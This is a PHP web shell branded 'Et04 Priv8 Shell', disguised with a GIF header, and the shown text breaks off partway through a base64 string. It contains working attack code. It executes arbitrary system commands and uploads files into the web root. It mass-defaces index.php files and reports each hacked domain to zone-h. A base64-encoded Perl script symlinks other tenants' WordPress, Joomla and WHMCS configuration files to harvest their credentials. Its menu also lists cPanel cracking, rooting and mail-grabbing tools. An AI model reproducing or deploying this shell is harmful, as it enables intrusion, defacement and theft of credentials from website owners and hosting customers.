GIF89;a
<?php
set_time_limit(0);
error_reporting(0);

function validUrl($url) {
  if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
    return "http://$url";
  } else {
    return $url;
  }
}

function w($dir,$perm) {
  if(!is_writable($dir)) {
    return "<font color=red>".$perm."</font>";
  } else {
    return "<font color=lime>".$perm."</font>";
  }
}
function r($dir,$perm) {
  if(!is_readable($dir)) {
    return "<font color=red>".$perm."</font>";
  } else {
    return "<font color=lime>".$perm."</font>";
  }
}

function exe($cmd) {
  if(function_exists('system')) {     
    @ob_start();    
    @system($cmd);    
    $buff = @ob_get_contents();     
    @ob_end_clean();    
    return $buff;   
  } elseif(function_exists('exec')) {     
    @exec($cmd,$results);     
    $buff = "";     
    foreach($results as $result) {      
      $buff .= $result;     
    } return $buff;   
  } elseif(function_exists('passthru')) {     
    @ob_start();    
    @passthru($cmd);    
    $buff = @ob_get_contents();     
    @ob_end_clean();    
    return $buff;   
  } elseif(function_exists('shell_exec')) {     
    $buff = @shell_exec($cmd);    
    return $buff;   
  } 
}

function hdd($s) {
  if($s >= 1073741824)
  return sprintf('%1.2f',$s / 1073741824 ).' GB';
  elseif($s >= 1048576)
  return sprintf('%1.2f',$s / 1048576 ) .' MB';
  elseif($s >= 1024)
  return sprintf('%1.2f',$s / 1024 ) .' KB';
  else
  return $s .' B';
}

function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

function sendsite($target) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_URL, "http://zone-h.org/notify/single");
          curl_setopt($ch, CURLOPT_POST, true);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, array(
            "defacer" => "Et04",
            "domain1" => $target,
            "hackmode" => "1",
            "reason" => "1",
            ));
    $res = curl_exec($ch);
          curl_close($ch);
    return preg_match("/color=\"red\">OK<\/font><\/li>/i", $res);
}

if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
?>
</br>
<html>
<head>
<title>&#1203;&#824;&#1202;&#824;&#1203; Et04 Priv8 Shell &#1203;&#824;&#1202;&#824;&#1203;</title>
<meta name='author' content='Et04'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Iceland);
html {
  background: #000000;
  color: #ffffff;
  font-family: 'Iceland';
  font-size: 17px;
  width: 100%;
}
li {
  display: inline;
  margin: 5px;
  padding: 5px;
  color: dodgerblue;
}
table, th, td {
  border-collapse:collapse;
  font-family: Tahoma, Geneva, sans-serif;
  background: transparent;
  font-family: 'Iceland';
  font-size: 17px;
  border: 1px solid #333333;
}
.table_home, .td_home {
  border: 1px solid #333333;
}
.th_home {
  color: dodgerblue;
}
th {
  padding: 10px;
  border: 1px solid #333333;
}
a {
  color: #ffffff;
  text-decoration: none;
}
a:hover {
  color: dodgerblue;
  text-decoration: underline;
}
b {
  color: dodgerblue;
}
input[type=text], input[type=password],input[type=submit] {
  background: transparent; 
  color: dodgerblue; 
  border: 1px solid #333333; 
  margin: 5px auto;
  padding-left: 5px;
  font-family: 'Iceland';
  font-size: 15px;
}
textarea {
  border: 1px solid #333333;
  width: 100%;
  height: 400px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background: transparent;
  color: dodgerblue;
  font-family: 'Iceland';
  font-size: 15px;
}
select {
  background: #000000; 
  color: dodgerblue; 
  border: 1px solid #333333; 
  font-family: 'Iceland';
  font-size: 15px;
}
option:hover {
  background: lime;
  color: dodgerblue;
}
</style>
</head>
<?php

if(isset($_GET['dir'])) {
  $dir = $_GET['dir'];
  chdir($dir);
} else {
  $dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
  $user = @get_current_user();
  $uid = @getmyuid();
  $gid = @getmygid();
  $group = "?";
} else {
  $uid = @posix_getpwuid(posix_geteuid());
  $gid = @posix_getgrgid(posix_getegid());
  $user = $uid['name'];
  $uid = $uid['uid'];
  $group = $gid['name'];
  $gid = $gid['gid'];
}
$file = @implode(@file("/etc/named.conf"));
if (!$file) {
  echo "";
}
preg_match_all("#named/(.*?).db#", $file, $r);
$domains = array_unique($r[1]);
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Domain On Server : <font color=lime>".count($domains)."</font><br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {  
  echo "<a href='?dir=";
  for($i = 0; $i <= $c_dir; $i++) {
    echo $scdir[$i];
    if($i != $c_dir) {
    echo "/";
    }
  }
  echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo "</br>";
echo "<form method='post'>
  <font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
  <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
  </form>";
if($_POST['upload']) {
  if($_POST['tipe_upload'] == 'biasa') {
    if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
      $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
    } else {
      $act = "<font color=red>failed to upload file</font>";
    }
  } else {
    $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
    $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
    if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
      if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
        $act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
      } else {
        $act = "<font color=red>failed to upload file</font>";
      }
    } else {
      $act = "<font color=red>failed to upload file</font>";
    }
  }
}
echo "Upload File:
<form method='post' enctype='multipart/form-data'>
<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
<input type='file' name='ix_file'>
<input type='submit' value='upload' name='upload'>
</form>";
echo $act;
echo "<hr color='dodgerblue'>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a href='?'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=move'>Move</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=config'>Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumpingv2'>Jumping V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=sym'>Symlink</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=sym404'>Sym404</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>Cpanel Crack</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=root'>Simple Root</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=targz'>Extract tar.gz</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=delete'>Delete Empty Dir</a> ]</li></br>";
echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_userv2'>Auto Edit User V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_grab_mail'>Auto Grab Mail</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mailzip'>Check mail.zip</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> ]</li>";
echo "</ul>";
echo "</center>";
echo "<hr color='dodgerblue'>";
if($_POST['do_cmd']) {
    echo "<pre>".exe($_POST['cmd'])."</pre>"; 
  } elseif($_GET['do'] == 'move') { 
echo"<center><form method=post>From : <input type='text' name='from' value=''>
</br>
To : <input type='text' name='to' value=''>
</br>
<input type=submit name=gass value='Move'>
  </form></center></br>";
  if($_POST['gass']) {
    $from = $_POST['from'];
    $to = $_POST['to'];
  exe("mv $from $to");
}        
} elseif($_GET['do'] == 'mass_deface') {
  function sabun_massal($dir,$namafile,$isi_script) {
    if(is_writable($dir)) {
      $dira = scandir($dir);
      foreach($dira as $dirb) {
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.') {
          file_put_contents($lokasi, $isi_script);
        } elseif($dirb === '..') {
          file_put_contents($lokasi, $isi_script);
        } else {
          if(is_dir($dirc)) {
            if(is_writable($dirc)) {
              echo "[<font color=lime>DONE</font>] $lokasi<br>";
              file_put_contents($lokasi, $isi_script);
              $idx = sabun_massal($dirc,$namafile,$isi_script);
            }
          }
        }
      }
    }
  }
  function sabun_biasa($dir,$namafile,$isi_script) {
    if(is_writable($dir)) {
      $dira = scandir($dir);
      foreach($dira as $dirb) {
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.') {
          file_put_contents($lokasi, $isi_script);
        } elseif($dirb === '..') {
          file_put_contents($lokasi, $isi_script);
        } else {
          if(is_dir($dirc)) {
            if(is_writable($dirc)) {
              echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
              file_put_contents($lokasi, $isi_script);
            }
          }
        }
      }
    }
  }
  function hapus_massal($dir,$namafile) {
    if(is_writable($dir)) {
      $dira = scandir($dir);
      foreach($dira as $dirb) {
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.') {
          if(file_exists("$dir/$namafile")) {
            unlink("$dir/$namafile");
          }
        } elseif($dirb === '..') {
          if(file_exists("".dirname($dir)."/$namafile")) {
            unlink("".dirname($dir)."/$namafile");
          }
        } else {
          if(is_dir($dirc)) {
            if(is_writable($dirc)) {
              if(file_exists($lokasi)) {
                echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                unlink($lokasi);
                $idx = hapus_massal($dirc,$namafile);
              }
            }
          }
        }
      }
    }
  }
  if($_POST['start']) {
    if($_POST['tipe_sabun'] == 'mahal') {
      echo "<div style='margin: 5px auto; padding: 5px'>";
      sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
      echo "</div>";
    } elseif($_POST['tipe_sabun'] == 'murah') {
      echo "<div style='margin: 5px auto; padding: 5px'>";
      sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
      echo "</div>";
    } elseif($_POST['tipe_sabun'] == 'hapus') {
      echo "<div style='margin: 5px auto; padding: 5px'>";
      hapus_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
      echo "</div>";
    }
  } else {
  echo "<center>";
  echo "<form method='post'>
  <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
  <input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<input type='radio' name='tipe_sabun' value='hapus'>Hapus<br>
  <font style='text-decoration: underline;'>Folder:</font><br>
  <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
  <font style='text-decoration: underline;'>Filename:</font><br>
  <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
  <font style='text-decoration: underline;'>Index File:</font><br>
  <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Et04</textarea><br>
  <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
  </form></center>";
  }
} elseif($_GET['do'] == 'config') {
  $idx = mkdir("anu", 0777);
  $isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
  $htc = fopen("anu/.htaccess","w");
  fwrite($htc, $isi_htc);
  fclose($htc);
  if(preg_match("/vhosts|vhost/", $dir)) {
    $link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    $vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3